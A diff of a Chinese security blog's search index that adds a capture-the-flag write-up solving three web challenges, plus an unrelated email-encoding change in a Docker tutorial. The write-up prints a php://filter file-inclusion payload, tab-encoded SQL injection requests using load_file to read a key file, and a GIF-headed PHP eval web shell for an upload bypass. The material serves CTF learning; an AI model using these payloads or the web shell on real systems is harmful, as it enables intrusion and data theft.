@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title><![CDATA[week 6 for cnas writeup]]></title>
+      <url>http://uknowsec.cn/posts/ctf/week-6-for-cnas-writeup.html</url>
+      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
+<h2 id="文件包含-10"><a href="#文件包含-10" class="headerlink" title="文件包含 10"></a>文件包含 10</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="external">http://47.100.121.220:28001/01.php</a></p>
+<h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>这个题目又是一个文件包含的题目，这里直接用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file=php://filter/read=convert.base64-encode/resource=./key.php</div></pre></td></tr></table></figure>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/flie1111.png" alt=""></p>
+<h2 id="SQL注入-10"><a href="#SQL注入-10" class="headerlink" title="SQL注入 10"></a>SQL注入 10</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/02.php" target="_blank" rel="external">http://47.100.121.220:28001/02.php</a></p>
+<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><p>这个题目是一个注入题，经过测试可以知道过滤了空格，这里可以用%09进行绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28002/02.php?id=1&apos;)%09order%09by%091%23 		返回正常</div><div class="line"></div><div class="line">http://47.100.121.220:28002/02.php?id=1&apos;)%09order%09by%092%23		返回正常</div><div class="line"></div><div class="line">http://47.100.121.220:28002/02.php?id=1&apos;)%09order%09by%093%23		返回异常</div></pre></td></tr></table></figure>
+<p>得到字段数为3</p>
+<p>提示key在/tmp/360/key中</p>
+<p>然后用load_file()函数读取文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28002/02.php?id=0%27%29%09union%09select%091,load_file(&apos;/tmp/360/key&apos;)%23</div></pre></td></tr></table></figure>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/week06_02.png" alt=""></p>
+<p>由于数据读取的问题，把id的值改为不存在的值即可读到key</p>
+<h2 id="文件上传-10"><a href="#文件上传-10" class="headerlink" title="文件上传 10"></a>文件上传 10</h2><h3 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28003/03.php" target="_blank" rel="external">http://47.100.121.220:28003/03.php</a></p>
+<h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h3><p>这个上传题是检验文件头的，所以直接在php文件加上图片的文件头即可上传成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">GIF89a</div><div class="line">&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</div></pre></td></tr></table></figure>
+<p>菜刀连接即可。</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/week06_03.png" alt=""></p>
+]]></content>
+    </entry>
+    
+    <entry>
       <title><![CDATA[week 5 for cnas writeup]]></title>
       <url>http://uknowsec.cn/posts/ctf/week-5-for-cnas-writeup.html</url>
       <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
@@ -917,7 +942,7 @@
 <h2 id="使用commit命令从容器的修改中创建镜像"><a href="#使用commit命令从容器的修改中创建镜像" class="headerlink" title="使用commit命令从容器的修改中创建镜像"></a>使用commit命令从容器的修改中创建镜像</h2><p>docker commit 命令从容器的修改中创建新的镜像<br>假设hello-nginx容器中的文件内容发生变化，将容器创建为镜像文件。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker commit -a &quot;Foo Bar &lt;foo@bar.com&gt;&quot; -m &quot;add hello.txt&quot; hello-nginx hello:0.2</div></pre></td></tr></table></figure>
 <p>命令格式为docker commit &lt;选项&gt;&lt;容器名称&gt;&lt;镜像名称&gt;：&lt;标签&gt;</p>
-<p>-a “Foo Bar<a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#x66;&#111;&#111;&#64;&#98;&#x61;&#114;&#x2e;&#x63;&#111;&#x6d;">&#x66;&#111;&#111;&#64;&#98;&#x61;&#114;&#x2e;&#x63;&#111;&#x6d;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
+<p>-a “Foo Bar<a href="&#x6d;&#97;&#x69;&#108;&#x74;&#x6f;&#x3a;&#x66;&#x6f;&#x6f;&#x40;&#98;&#97;&#x72;&#x2e;&#x63;&#x6f;&#109;">&#x66;&#x6f;&#x6f;&#x40;&#98;&#97;&#x72;&#x2e;&#x63;&#x6f;&#109;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
 <h2 id="使用diff命令检查容器文件的修改"><a href="#使用diff命令检查容器文件的修改" class="headerlink" title="使用diff命令检查容器文件的修改"></a>使用diff命令检查容器文件的修改</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker diff hello-nginx</div></pre></td></tr></table></figure>
 <p>命令格式为docker diff&lt;容器名称&gt;，A为添加文件，C为修改的文件，D为删除的文件。</p>
 <h2 id="使用inspect命令查看详细信息"><a href="#使用inspect命令查看详细信息" class="headerlink" title="使用inspect命令查看详细信息"></a>使用inspect命令查看详细信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker inspect hello-nginx</div></pre></td></tr></table></figure>
